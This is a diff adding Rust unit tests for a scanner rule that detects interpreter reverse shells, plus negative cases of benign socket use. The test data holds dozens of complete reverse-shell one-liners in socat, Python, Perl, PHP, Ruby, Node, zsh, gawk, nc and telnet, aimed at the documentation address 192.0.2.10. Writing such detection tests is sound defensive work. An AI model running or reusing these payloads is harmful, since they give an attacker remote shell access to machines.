@@ -700,6 +700,102 @@ mod tests {
         }
     }
 
+    #[test]
+    fn detects_interpreter_reverse_shells() {
+        let rule = "command_injection_interpreter_reverse_shell";
+        // One representative of each family, across shells and flag orders. These
+        // are synthetic payloads aimed at the TEST-NET-1 address (RFC 5737).
+        for sh in ["/bin/sh", "/bin/bash", "sh", "bash"] {
+            for cmd in [
+                format!("socat TCP:192.0.2.10:4444 EXEC:{sh},pty,stderr"),
+                format!("socat EXEC:{sh} tcp-connect:192.0.2.10:4444"),
+                format!("socat TCP4:192.0.2.10:4444 SYSTEM:{sh}"),
+                format!(
+                    "python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"192.0.2.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call([\"{sh}\",\"-i\"])'"
+                ),
+                format!(
+                    "python3 -c 'import pty,socket;s=socket.socket();s.connect((\"192.0.2.10\",4444));pty.spawn(\"{sh}\")'"
+                ),
+                format!(
+                    "perl -e 'use Socket;connect(S,sockaddr_in(4444,inet_aton(\"192.0.2.10\")));open(STDIN,\">&S\");exec(\"{sh} -i\");'"
+                ),
+                format!(
+                    "php -r '$s=fsockopen(\"192.0.2.10\",4444);exec(\"{sh} -i <&3 >&3 2>&3\");'"
+                ),
+                format!(
+                    "ruby -rsocket -e 'f=TCPSocket.open(\"192.0.2.10\",4444).to_i;exec sprintf(\"{sh} -i <&%d >&%d 2>&%d\",f,f,f)'"
+                ),
+                format!(
+                    "node -e 'var cp=require(\"child_process\"),s=cp.spawn(\"{sh}\",[]);require(\"net\").connect(4444,\"192.0.2.10\",function(){{this.pipe(s.stdin);s.stdout.pipe(this)}})'"
+                ),
+                format!(
+                    "zsh -c 'zmodload zsh/net/tcp && ztcp 192.0.2.10 4444 && {sh} >&$REPLY 2>&$REPLY 0>&$REPLY'"
+                ),
+                format!("mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc 192.0.2.10 4444 >/tmp/f"),
+            ] {
+                assert!(hits(&cmd, rule), "expected {rule} for {cmd:?}");
+            }
+        }
+        // Interpreter-independent gawk socket.
+        assert!(hits(
+            "awk 'BEGIN{s=\"/inet/tcp/0/192.0.2.10/4444\";while((s|&getline c)>0){close(c)}}'",
+            rule
+        ));
+    }
+
+    #[test]
+    fn detects_other_ways_to_bind_a_shell_to_a_socket() {
+        let rule = "command_injection_interpreter_reverse_shell";
+        // Each binds the shell to the socket differently from the cases above:
+        // subprocess std streams, a dup2 loop, from-import, an aliased module,
+        // list-form pty, command substitution, and less common exec primitives.
+        for cmd in [
+            "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"192.0.2.10\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+            "python3 -c 'import socket,subprocess as sp;s=socket.socket();s.connect((\"192.0.2.10\",4444));sp.run(\"/bin/sh\",shell=True,stdin=s.fileno())'",
+            "python3 -c 'from socket import *;import os;s=socket(AF_INET,SOCK_STREAM);s.connect((\"192.0.2.10\",4444));os.dup2(s.fileno(),0);os.execl(\"/bin/sh\",\"sh\",\"-i\")'",
+            "python3 -c 'import socket,os;s=socket.socket();s.connect((\"192.0.2.10\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];os.system(\"/bin/bash\")'",
+            "python3 -c 'import socket,pty;s=socket.socket();s.connect((\"192.0.2.10\",4444));import os;os.dup2(s.fileno(),0);pty.spawn([\"/bin/bash\",\"-i\"])'",
+            "ruby -rsocket -e 'c=TCPSocket.new(\"192.0.2.10\",4444);while l=c.gets;c.write(%x{#{l}});end'",
+            "ruby -rsocket -e 'require \"open3\";s=TCPSocket.open(\"192.0.2.10\",4444);Open3.popen3(\"/bin/sh\")'",
+            "php -r '$s=fsockopen(\"192.0.2.10\",4444);fwrite($s,`id`);'",
+            "php -r '$s=fsockopen(\"192.0.2.10\",4444);pcntl_exec(\"/bin/sh\",array(\"-i\"));'",
+            "node -e 'require(\"net\").connect(4444,\"192.0.2.10\",function(){require(\"child_process\").execFileSync(\"/bin/bash\",[\"-i\"],{stdio:[this,this,this]})})'",
+            "perl -e 'use Socket;connect(S,sockaddr_in(4444,inet_aton(\"192.0.2.10\")));$o=qx(/bin/sh -i);print S $o;'",
+            "mkfifo /tmp/bp && telnet 192.0.2.10 4444 0</tmp/bp | /bin/bash -i 1>/tmp/bp 2>&1",
+        ] {
+            assert!(hits(cmd, rule), "expected {rule} for {cmd:?}");
+        }
+    }
+
+    #[test]
+    fn sockets_without_a_bound_shell_are_not_reverse_shells() {
+        let rule = "command_injection_interpreter_reverse_shell";
+        for cmd in [
+            // network clients and services that bind no shell
+            "socat TCP-LISTEN:8080,fork TCP:localhost:3000",
+            "socat - TCP:localhost:6379",
+            "socat TCP-LISTEN:1234,fork EXEC:/usr/bin/figlet",
+            "python3 -c 'import socket; print(socket.gethostbyname(\"example.com\"))'",
+            "python3 -c 'import socket,subprocess; subprocess.run([\"ls\"])'",
+            // daemonize: stdout/stderr to a file, never stdin from a socket
+            "python3 -c 'import socket,os; f=open(\"/tmp/log\",\"a\"); os.dup2(f.fileno(),1); os.dup2(f.fileno(),2)'",
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "perl -MIO::Socket -e '$s=IO::Socket::INET->new(\"example.com:80\"); print $s \"GET /\";'",
+            "perl -e 'use Socket; system(\"date\")'",
+            "php -r 'echo fsockopen(\"localhost\",80) ? 1 : 0;'",
+            "ruby -rsocket -e 'TCPSocket.open(\"localhost\",80){|s| s.puts \"GET /\"}'",
+            "node -e 'require(\"net\").connect(3000,\"localhost\")'",
+            "node -e 'require(\"child_process\").execSync(\"ls\")'",
+            "mkfifo /tmp/p; nc -l 9000 < /tmp/p",
+            // shell execution with no socket connected to it
+            "python3 -c 'import socket, subprocess as sp; print(socket.gethostname()); sp.run([\"bash\",\"-c\",\"make\"])'",
+            "php -r 'echo `date`;'",
+            "ruby -e 'puts %x{ls -la}'",
+        ] {
+            assert!(!hits(cmd, rule), "unexpected {rule} for {cmd:?}");
+        }
+    }
+
     // --- Supply chain rules ---
 
     #[test]
